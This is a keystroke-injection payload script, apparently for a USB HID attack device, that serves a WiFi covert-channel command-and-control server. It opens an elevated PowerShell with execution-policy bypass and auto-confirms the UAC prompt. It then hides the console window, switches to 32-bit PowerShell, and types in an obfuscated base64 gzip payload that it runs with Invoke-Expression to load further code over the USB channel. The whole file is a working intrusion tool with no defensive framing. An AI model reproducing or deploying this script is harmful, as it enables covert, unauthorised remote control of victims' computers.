/*
Controlling the server:
   - The WiFi covert channel server is bound to a screen session called 'wifi_c2' and could attached
   to a SSH session by running:
      $ screen -d -r wifi_c2
*/

language="us";
hide=true; // set to true to hide the console window on the target

// Hide an already opened PowerShell console, but keep input focus, to gon on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(4000);
}

function hidDownAndIEX(vid, pid) {
  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
  type("$b='H4sIAAAAAAAEAKVXbU/bSBD+jsR/sFzfxRGJ5VBaISR0Bwm0kUobNXA9XbDQxh4ne9jeaL1OG/X47zezu7YT2lSqCoLYuzPPPPO6m8ODtCpixUXhfIQ0g1gNJTAF1zyDG1BLkfjdw4OvhwdeInLn3JldrFYjkTNeRGdnw0pKKJR5JxGGEu/hc//D/F9EqhERPLgoS8jn2eY9y8F3b9gNnB6PNkW97KIRj81RnewEI0h5AbjPch7XMj7i95zZFuhVzlWDfFnxLAF5EcdQlkjuY1UQaK5B2XwX80YkVbZNxCy4Pce7ZlkJpKm0Zl5r3m5WjQLKuZNqnvG45wwzVpaaf5xShFDPatj4uW1E3V3+RuBCKcnnlYIyalGniikek/y4UBMlI3wiBrMocv70Z1NUKRaR2X55TA93zVOrcbd/1+lqygmnpGKsFM8hwD2QYjUFueYYxmCUZeN8JaRqOEbBG1BDUZRKVrES0m/JGMCUacDWyWsOWTIuUmGp/6Qtre67V4WSm4nghXK7vZ8mbEEmEkqUhClf/ALKFNQ7VqorKYX8BZghyzIMG8ZyjT2EkfoVrCWTSMu1KUjXOgmmC03Yd4vQu5UVNB97jX5DEdvqEy/Yiv9IyXBB0YtKCUMo3j8YdA8Pq1KJvHHNtrJP5dkj8o8gC8heHgdJllGYqMz0f/TUdl6ANp/B+NqyaeXA+K+bGFeeDtu510YGCxlYfi1FPgJyZsLU0vfyPM7QX1vljrfCVTsTl3pC4D7OwgbF1xJNa4Z/D0PzQ0sfAhJphxSw5JPkCtrGPDv7B+PZyuJkAlz8sIKi7ePwy8kW6LaiHqREixhcCpEBK6KQYnQ+u+GxFKVIVYBZxGhOWQpvWZFkmDZ6JnPm/Xmbl353Fka1xzEmfS0e0VMd3ZSd73eM6JwTGY9SZmPy+mSL3MCQswgmB9+zPzhBAhJUJYvnFLbTWUKRPCRMMd9LEQ8Nl6KSMT0kUCr6wE38kBADX0Nic8nPKUrzDc7h3WK9xKVZ5PivX3VrgZnHj44i6jF6jZxw34a1vXebGO3fRJ7BOygWarlXpnZCn74oPhSrza3wjTQ6yYlzAmsKRaAT0uxh6ZhHa+NZHDEN23G0UZI/ik0s9QFurVEJ+J7shT2zawIsgabYA09IVBp/cLmU8e5CUqpnEsUzFRmvdxfycvF9dqSLDGYXUrIN3VswSMQMw4N/qGaCYaTqCkNGVCu6YnCHCiZeG/HdQGGlbo+Lu+nlw1/jEUrS02Q8spF7Ox69qXhy7n49SQbw6tX8uJ8OXqf9wSBO+6en8bwfhgP8oaZ+GT65aEFgDuIl8v+cc4yqwwtngY+O7t4HhMcOUVJkGUjDwPnvt68zlIh87wEvITgyEhzc3Sen6yAFnjZQgZEfj5x+zhTZcGvirnPkdH5H3g8dfHJrL9yu08fR4OwF6KCDHSvUL4RqJO3JoClQcdB0xDy59/d/3JOxWm7yflKDYu2sMhaD37nv9DovEBaZvNDCNow6BU8toHmhUYzQe26yKECi57sZc2rHm4S1HYNYPz4dzPQ3ZwI1gMBDEZX6NNNKxRZwTJ5iLj3IV2rz/fIMsULwdqPL5POSzPpNE+2OZQwsOF5RZZkpqmbWNV3nhPhrjYXa4fgRiFLTzo2oLQgjgdNdg4cGOMbC4kUFOqzbYoP9Yl6l0lMaTbfwRQVXRSwSOjDPzu5ur09pnpsTtIE6iboWmxQDvPFKVX7i2EMuubUEfJ9j8OvK8214+wuF9g2BObr12JL8BmgOC15sQ9lmrBOFIZrRMYMnEd1taD6+w5s7XvIIxDHTFUk7JpmumZGA3xC0vZpQE5A66Uc4mIhMYwoXBt/a8t3AQj7tI2IB0U/zPQcS0uDwxbG2zDDCW1mWbew3NVs7w0yU+rbTrIx4ubJrqHR48D9inn4F/g0AAA==';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
  press("ENTER");
}

// script setup
layout("us");
//typingSpeed(2,4);

waitLED(ANY_OR_NONE, 4000); 

// start an administrator PowerShell console
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(2500);
press("ALT y");
delay(4000);

if (hide) { hidePS(); } //hide the console if choosen to do so
delay(4000);
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(4000);
hidDownAndIEX("1D6B", "1315");